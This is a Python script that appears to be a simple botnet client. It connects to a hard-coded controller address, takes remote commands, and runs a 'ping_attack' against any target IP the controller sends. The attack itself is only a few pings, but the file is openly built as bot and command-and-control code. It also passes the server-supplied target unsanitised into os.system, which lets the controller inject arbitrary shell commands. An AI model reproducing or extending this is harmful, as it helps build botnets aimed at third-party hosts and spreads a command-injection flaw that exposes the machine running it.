import socket
import threading
import os
import platform

class Client:
    def __init__(self, host='192.168.1.50', port=11111):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect_to_server(self):
        self.sock.connect((self.host, self.port))
        print("Connected to server.")

    def send_command(self, command):
        self.sock.send(command.encode())

    def handle_server_commands(self):
        while True:
            command = self.sock.recv(1024).decode().strip()
            print("Received command:", command)  # Debugging
            if not command:
                break
            if command.lower() == "exit":
                print("Server closed the connection. Exiting.")
                break
            elif command.lower().startswith("ping_attack "):
                target_ip = command.split(" ", 1)[1]
                print(f"Received ping attack command for {target_ip}. Initiating attack...")
                self.ping_attack(target_ip)
            else:
                print("Unknown command received from server.")

    def ping_attack(self, target_ip):
        try:
            os_name = platform.system()
            
            if os_name == "Windows":
                response = os.system(f"ping -n 5 {target_ip}")
            else:  # Unix/Linux
                response = os.system(f"ping -c 5 {target_ip}")
            
            if response == 0:
                print(f"{target_ip} is up!")
            else:
                print(f"{target_ip} is down!")
        except Exception as e:
            print(f"Error executing ping attack: {e}")

if __name__ == "__main__":
    client = Client()
    client.connect_to_server()

    # Iniciar un subproceso para manejar los comandos del servidor
    threading.Thread(target=client.handle_server_commands, daemon=True).start()

    while True:
        command = input("Botnet@client:~$ ").strip()
        client.send_command(command)
        if command.lower() == "exit":
            break